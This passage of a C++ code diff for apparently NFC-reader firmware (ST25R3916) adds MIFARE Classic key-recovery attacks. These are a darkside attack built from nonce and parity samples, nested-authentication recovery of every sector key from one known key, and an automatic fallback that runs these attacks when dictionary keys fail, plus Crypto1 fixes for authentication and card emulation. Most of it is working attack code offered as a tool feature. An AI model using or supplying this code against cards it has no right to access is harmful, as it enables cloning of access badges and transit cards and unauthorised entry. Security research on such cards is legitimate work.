+                    _mfcAuthed = false;
+                    continue;
+                }
+                ks[pos] = (uint8_t)(nack ^ 0x05u);
+                for (int j = 0; j < 8; j++) par[pos][j] = (uint8_t)((parByte >> (7 - j)) & 1u);
+                got = true;
+                break;
+            }
+            if (!got) sampleOk = false;
+        }
+        if (!sampleOk) continue;
+
+        ST25R_RECOVERY_LOG("darkside sample level=%d pfx=%08lX ks=%02X%02X%02X%02X%02X%02X%02X%02X",
+                           level, (unsigned long)prefix, ks[0], ks[1], ks[2], ks[3], ks[4], ks[5],
+                           ks[6], ks[7]);
+
+        uint64_t keys[8] = {0};
+        const int n = mfc_darkside::recoverKeys(prefix, arBase, ks, par, uid32, nt0, keys, 8);
+        if (n < 0) {
+            _nfc->rfalNfcDeactivate(false);
+            stopDiscovery();
+            return RecoveryResult::NoMemory;
+        }
+        for (int i = 0; i < n; i++) {
+            uint8_t cand[6];
+            for (int j = 0; j < 6; j++) cand[j] = (uint8_t)(keys[i] >> (8 * (5 - j)));
+            if (!_mfcDarksideSelect()) continue;
+            if (!_mifareAuth(block, cand, useB)) {
+                _mfcHalt();
+                _mfcAuthed = false;
+                continue;
+            }
+            memcpy(recoveredKey, cand, 6);
+            const uint8_t sec = _mfcBlockToSector(block);
+            if (sec < 40) {
+                if (useB) {
+                    memcpy(mfcDump.keyB[sec], cand, 6);
+                    mfcDump.keyBFound[sec] = true;
+                } else {
+                    memcpy(mfcDump.keyA[sec], cand, 6);
+                    mfcDump.keyAFound[sec] = true;
+                }
+                _mfcRebuildStrAllPages();
+            }
+            _mfcHalt();
+            _mfcAuthed = false;
+            _nfc->rfalNfcDeactivate(false);
+            stopDiscovery();
+            ST25R_RECOVERY_LOG("darkside recovered key for block %u key %c", block, useB ? 'B' : 'A');
+            return RecoveryResult::Verified;
+        }
+        _mfcHalt();
+        _mfcAuthed = false;
+    }
+
+    _nfc->rfalNfcDeactivate(false);
+    stopDiscovery();
+    _mfcAuthed = false;
+    return RecoveryResult::NotFound;
+}
+
+int ST25R3916::recoverAllKeys(mfc_recovery::Progress progress, void *context) {
+    if (!_nfc) return -1;
+    if (mfcDump.sectors == 0) return -1;
+
+    int bootSec = -1;
+    bool bootB = false;
+    for (uint8_t s = 0; s < mfcDump.sectors; s++) {
+        if (mfcDump.keyAFound[s]) {
+            bootSec = s;
+            bootB = false;
+            break;
+        }
+        if (mfcDump.keyBFound[s]) {
+            bootSec = s;
+            bootB = true;
+            break;
+        }
+    }
+    int found = 0;
+    if (bootSec < 0) {
+        uint8_t bootKey[6] = {0};
+        RecoveryResult res = recoverKeyDarkside(0, false, bootKey, progress, context);
+        if (res != RecoveryResult::Verified && res != RecoveryResult::AlreadyKnown &&
+            res != RecoveryResult::Cancelled && res != RecoveryResult::NoMemory) {
+            res = recoverKeyDarkside(0, true, bootKey, progress, context);
+        }
+        if (res == RecoveryResult::Cancelled) return -2;
+        if (res == RecoveryResult::NoMemory) return -3;
+        if (res != RecoveryResult::Verified && res != RecoveryResult::AlreadyKnown) {
+            ST25R_RECOVERY_LOG("recoverAll: darkside bootstrap failed: %s", recoveryStatus(res));
+            return -4;
+        }
+        bootSec = 0;
+        bootB = mfcDump.keyBFound[0] && !mfcDump.keyAFound[0];
+        found++;
+    }
+
+    const uint8_t knownBlock = _mfcSectorFirstBlock((uint8_t)bootSec);
+    uint8_t knownKey[6];
+    memcpy(knownKey, bootB ? mfcDump.keyB[bootSec] : mfcDump.keyA[bootSec], 6);
+
+    for (uint8_t s = 0; s < mfcDump.sectors; s++) {
+        const uint8_t first = _mfcSectorFirstBlock(s);
+        const uint8_t trailer = (uint8_t)(first + _mfcSectorBlockCount(s) - 1);
+        for (int useB = 0; useB <= 1; useB++) {
+            if (useB && mfcDump.keyBFound[s]) continue;
+            if (!useB && mfcDump.keyAFound[s]) continue;
+            _mfcHalt();
+            _mfcAuthed = false;
+            _nfc->rfalNfcDeactivate(false);
+            _discoveryStarted = false;
+            uint8_t key[6] = {0};
+            auto res = recoverKey(knownBlock, knownKey, bootB, trailer, useB != 0, key, progress, context);
+            ST25R_RECOVERY_LOG(
+                "recoverAll: sector %u key %c -> %s", s, useB ? 'B' : 'A', recoveryStatus(res)
+            );
+            if (res == RecoveryResult::Verified || res == RecoveryResult::AlreadyKnown) found++;
+            if (res == RecoveryResult::Cancelled) return -2;
+            if (res == RecoveryResult::NoMemory) return -3;
+            if (res == RecoveryResult::NoTag || res == RecoveryResult::Unsupported ||
+                res == RecoveryResult::InternalError || res == RecoveryResult::AuthenticationFailed) {
+                return -4;
+            }
+        }
+    }
+    if (found > 0) _mfcRebuildStrAllPages();
+    ST25R_RECOVERY_LOG("recoverAll: done, new keys=%d", found);
     return found;
 }
 
@@ -837,6 +1354,9 @@ int ST25R3916::read(int cardBaudRate) {
 
     _nfc->rfalNfcDeactivate(false);
     _discoveryStarted = false;
+    // A UID-only activation is not a successful MIFARE Classic read. Report the
+    // block result so serial/UI callers cannot treat Pages: 0 as success.
+    if (isMifareClassicSak(uid.sak)) return blkResult;
     return SUCCESS;
 }
 
@@ -2388,6 +2908,18 @@ uint8_t ST25R3916::_mfcBlockToSector(uint16_t block) const {
     return (uint8_t)(32 + (block - 128) / 16);
 }
 
+// MIFARE Classic nonce-recovery working state (file scope).
+struct MfcNonceSample {
+    uint32_t nt;
+    uint8_t block;
+    bool useKeyB;
+};
+static constexpr int MFC_NONCE_MAX_SAMPLES = 128;
+static MfcNonceSample _mfcNonces[MFC_NONCE_MAX_SAMPLES];
+static uint32_t _mfcRecoveredPrngState = 0;
+static uint8_t _mfcRecoveredKeyA[40][6] = {};
+static uint8_t _mfcRecoveredKeyB[40][6] = {};
+
 // Pack data+parity into an ISO14443-A bitstream (LSB first, 9 bits per byte).
 static uint16_t _mfcPackBits(const uint8_t *data, const uint8_t *par, uint8_t nbytes, uint8_t *out) {
     uint16_t bit = 0;
@@ -2425,6 +2957,14 @@ static uint8_t _mfcUnpackBits(const uint8_t *in, uint16_t nbits, uint8_t *outDat
         if (bit < nbits) bit++; // skip parity bit
     }
     return nbytes;
+}
+
+// Extract the parity bit that follows each data byte (bits 8, 17, 26, ...).
+static uint8_t _mfcUnpackParity(const uint8_t *in, uint16_t nbits, uint8_t *outPar, uint8_t maxBytes) {
+    uint8_t n = 0;
+    for (uint16_t bit = 8; bit < nbits && n < maxBytes; bit += 9)
+        outPar[n++] = (uint8_t)((in[bit >> 3] >> (bit & 7)) & 1u);
+    return n;
 }
 
 // Encrypted MIFARE frame: software supplies parity (PAR_TX_NONE) and CRC
@@ -2499,6 +3039,7 @@ bool ST25R3916::_mifareAuth(uint8_t block, const uint8_t key[6], bool useKeyB) {
         uint8_t ntBuf[4] = {0};
         _mfcUnpackBits(rx, rxBits, ntBuf, 4);
         nt = ((uint32_t)ntBuf[0] << 24) | ((uint32_t)ntBuf[1] << 16) | ((uint32_t)ntBuf[2] << 8) | ntBuf[3];
+        _mfcLastNt = nt;
         crypto1_init(&_mfcCipher, k);
         crypto1_word(&_mfcCipher, nt ^ _mfcUid32(), 0);
     } else {
@@ -2522,12 +3063,11 @@ bool ST25R3916::_mifareAuth(uint8_t block, const uint8_t key[6], bool useKeyB) {
         }
         uint8_t encNt[4] = {0};
         _mfcUnpackBits(rx, rxBits, encNt, 4);
-        for (int i = 0; i < 4; i++) {
-            uint8_t ksb = crypto1_byte(&_mfcCipher, 0, 0);
-            nt = (nt << 8) | (uint8_t)(encNt[i] ^ ksb);
-        }
+        uint32_t encryptedNt = ((uint32_t)encNt[0] << 24) | ((uint32_t)encNt[1] << 16) |
+                               ((uint32_t)encNt[2] << 8) | encNt[3];
         crypto1_init(&_mfcCipher, k);
-        crypto1_word(&_mfcCipher, nt ^ _mfcUid32(), 0);
+        nt = encryptedNt ^ crypto1_word(&_mfcCipher, encryptedNt ^ _mfcUid32(), 1);
+        _mfcLastNt = nt;
     }
 
     // Build encrypted reader answer: nr (fed in) + ar (= suc64(nt)).
@@ -2762,6 +3302,12 @@ int ST25R3916::_mfcCollectNonces(
 
     // Re-select the card before starting nonce collection.
     _mfcAuthed = false;
+    rfalNfcDevice *d2 = nullptr;
+    if (!_pollForTag(&d2, 500)) {
+        ST25R_LOG("mfc recover: card lost before nonce collection");
+        return 0;
+    }
+    _parseDevice(d2);
 
     for (int i = 0; i < maxSamples; i++) {
         uint32_t nt = 0;
@@ -2884,7 +3430,7 @@ bool ST25R3916::_mfcRecoverKeyByNestedAuth(
     Crypto1State cipher2 = _mfcCipher;
     uint32_t nt = 0;
     for (int i = 0; i < 4; i++) {
-        uint8_t ksb = crypto1_byte(&cipher2, 0, 0);
+        uint8_t ksb = crypto1_byte(&cipher2, encNt[i], 1);
         nt = (nt << 8) | (uint8_t)(encNt[i] ^ ksb);
     }
 
@@ -2932,6 +3478,10 @@ bool ST25R3916::_mfcRecoverSectorKeys(
     // but here we directly try the bootstrap key only. Dictionary is handled by _readMifareClassic.
 
     // Phase 3: Darkside — collect nonces and recover PRNG state.
+    ST25R_LOG(">>> DARKSIDE sector %u: bootstrap %02X%02X%02X%02X%02X%02X — collecting nonces…",
+              sector, bootstrapKey[0], bootstrapKey[1], bootstrapKey[2],
+              bootstrapKey[3], bootstrapKey[4], bootstrapKey[5]);
+    ST25R_LOG_SCREEN(">>> DARKSIDE sector %u — collecting nonces…", sector);
     _mfcCollectNonces(dev, trailer, false, 128); // Key A
     if (_mfcNonceCount >= 8) {
         uint32_t prngState = 0;
@@ -3065,7 +3615,11 @@ void ST25R3916::_mfcRebuildStrAllPages() {
         }
         strAllPages += String(line) + "\n";
     }
-    dataPages = mfcDump.totalBlocks;
+    int readCount = 0;
+    for (uint16_t b = 0; b < mfcDump.totalBlocks; b++) {
+        if (mfcDump.blockRead[b]) readCount++;
+    }
+    dataPages = readCount;
     totalPages = mfcDump.totalBlocks;
 }
 
@@ -3118,6 +3672,7 @@ int ST25R3916::_readMifareClassic(rfalNfcDevice *dev) {
                 delay(5);
                 rfalNfcDevice *d2 = nullptr;
                 if (!_pollForTag(&d2, 500)) {
+                    _mfcRebuildStrAllPages();
                     pageReadStatus = FAILURE;
                     return FAILURE;
                 }
@@ -3144,6 +3699,7 @@ int ST25R3916::_readMifareClassic(rfalNfcDevice *dev) {
                     delay(5);
                     rfalNfcDevice *d2 = nullptr;
                     if (!_pollForTag(&d2, 500)) {
+                        _mfcRebuildStrAllPages();
                         pageReadStatus = FAILURE;
                         return FAILURE;
                     }
@@ -3154,17 +3710,100 @@ int ST25R3916::_readMifareClassic(rfalNfcDevice *dev) {
         }
 
         if (!authed) {
-            // No dictionary auth - do not run bogus recovery. Leave sector unread.
-            _mfcHalt();
-            _nfc->rfalNfcDeactivate(false);
-            delay(5);
-            rfalNfcDevice *d2 = nullptr;
-            if (s + 1 < mfcDump.sectors) {
-                if (!_pollForTag(&d2, 500)) break;
-                _parseDevice(d2);
-                _mfcAuthed = false;
+            // Dictionary failed; use any known key as bootstrap and try the
+            // missing key type for this sector.
+            int bootSec = -1;
+            bool bootB = false;
+            for (uint8_t bs = 0; bs < mfcDump.sectors; bs++) {
+                if (mfcDump.keyAFound[bs]) {
+                    bootSec = bs;
+                    bootB = false;
+                    break;
+                }
+                if (mfcDump.keyBFound[bs]) {
+                    bootSec = bs;
+                    bootB = true;
+                    break;
+                }
             }
-            continue;
+            if (bootSec >= 0) {
+                const uint8_t knownBlock = (uint8_t)(_mfcSectorFirstBlock((uint8_t)bootSec) +
+                                                     _mfcSectorBlockCount((uint8_t)bootSec) - 1);
+                uint8_t knownKey[6];
+                memcpy(knownKey, bootB ? mfcDump.keyB[bootSec] : mfcDump.keyA[bootSec], 6);
+                auto progress = [](unsigned done, unsigned total, void *) {
+                    static uint32_t lastYield = 0;
+                    const uint32_t now = millis();
+                    if (now - lastYield >= 100) {
+                        lastYield = now;
+                        delay(1);
+                    }
+                    if (done != 0 && (done & 0x0F) == 0) {
+                        ST25R_LOG_SCREEN("Nested %u/%u", done, total);
+                    }
+                    return !check(EscPress);
+                };
+                ST25R_LOG_SCREEN(">>> NESTED sector %u — key recovery…", s);
+                for (int targetB = 0; targetB <= 1 && !authed; targetB++) {
+                    if (targetB ? mfcDump.keyBFound[s] : mfcDump.keyAFound[s]) continue;
+                    uint8_t recoveredKey[6] = {0};
+                    auto res = recoverKey(
+                        knownBlock, knownKey, bootB, trailer, targetB != 0, recoveredKey, progress
+                    );
+                    ST25R_RECOVERY_LOG(
+                        "auto recover sector %u key %c -> %s", s, targetB ? 'B' : 'A',
+                        recoveryStatus(res)
+                    );
+                    if (res == RecoveryResult::Cancelled) {
+                        _mfcHalt();
+                        _mfcAuthed = false;
+                        _nfc->rfalNfcDeactivate(false);
+                        _mfcRebuildStrAllPages();
+                        pageReadStatus = FAILURE;
+                        return FAILURE;
+                    }
+                    if (res == RecoveryResult::Verified || res == RecoveryResult::AlreadyKnown) {
+                        memcpy(usedKeyBytes, recoveredKey, 6);
+                        usedKeyB = targetB != 0;
+                        authed = true;
+                    }
+                }
+            }
+            if (!authed) {
+                _mfcHalt();
+                _nfc->rfalNfcDeactivate(false);
+                delay(5);
+                rfalNfcDevice *d2 = nullptr;
+                if (s + 1 < mfcDump.sectors) {
+                    if (!_pollForTag(&d2, 500)) break;
+                    _parseDevice(d2);
+                    _mfcAuthed = false;
+                }
+                continue;
+            }
+            // Re-authenticate with recovered key so cipher state is set for block reads.
+            if (!mfcReselect(5000)) {
+                _mfcHalt();
+                _mfcAuthed = false;
+                rfalNfcDevice *d2 = nullptr;
+                if (s + 1 < mfcDump.sectors) {
+                    if (!_pollForTag(&d2, 500)) break;
+                    _parseDevice(d2);
+                    _mfcAuthed = false;
+                }
+                continue;
+            }
+            if (!_mifareAuth(trailer, usedKeyBytes, usedKeyB)) {
+                _mfcHalt();
+                _mfcAuthed = false;
+                rfalNfcDevice *d2 = nullptr;
+                if (s + 1 < mfcDump.sectors) {
+                    if (!_pollForTag(&d2, 500)) break;
+                    _parseDevice(d2);
+                    _mfcAuthed = false;
+                }
+                continue;
+            }
         }
 
         if (usedKeyB) {
@@ -3638,7 +4277,7 @@ bool ST25R3916::_emuMfcHandle(uint8_t *fifo, uint16_t n) {
             // ACK phase 1 (4-bit 0x0A, encrypted)
             uint8_t ackbs = 0;
             for (int i = 0; i < 4; i++)
-                ackbs |= (uint8_t)((crypto1_bit(&_emuCipher, 0, 0) ^ ((0x0A >> i) & 1)) << i);
+                ackbs |= (uint8_t)((crypto1_bit(&_emuCipher, (uint8_t)((0x0A >> i) & 1), 0) ^ ((0x0A >> i) & 1)) << i);
             _emuTxBits(&ackbs, 4);
             // data phase
             uint8_t dbuf[40] = {0};
@@ -3650,7 +4289,7 @@ bool ST25R3916::_emuMfcHandle(uint8_t *fifo, uint16_t n) {
             if (blk < mfcDump.totalBlocks && dn >= 16) memcpy(mfcDump.blocks[blk], dd, 16);
             uint8_t ack2 = 0;
             for (int i = 0; i < 4; i++)
-                ack2 |= (uint8_t)((crypto1_bit(&_emuCipher, 0, 0) ^ ((0x0A >> i) & 1)) << i);
+                ack2 |= (uint8_t)((crypto1_bit(&_emuCipher, (uint8_t)((0x0A >> i) & 1), 0) ^ ((0x0A >> i) & 1)) << i);
             _emuTxBits(&ack2, 4);
         } else if (c == 0x50) { // HALT
             break;
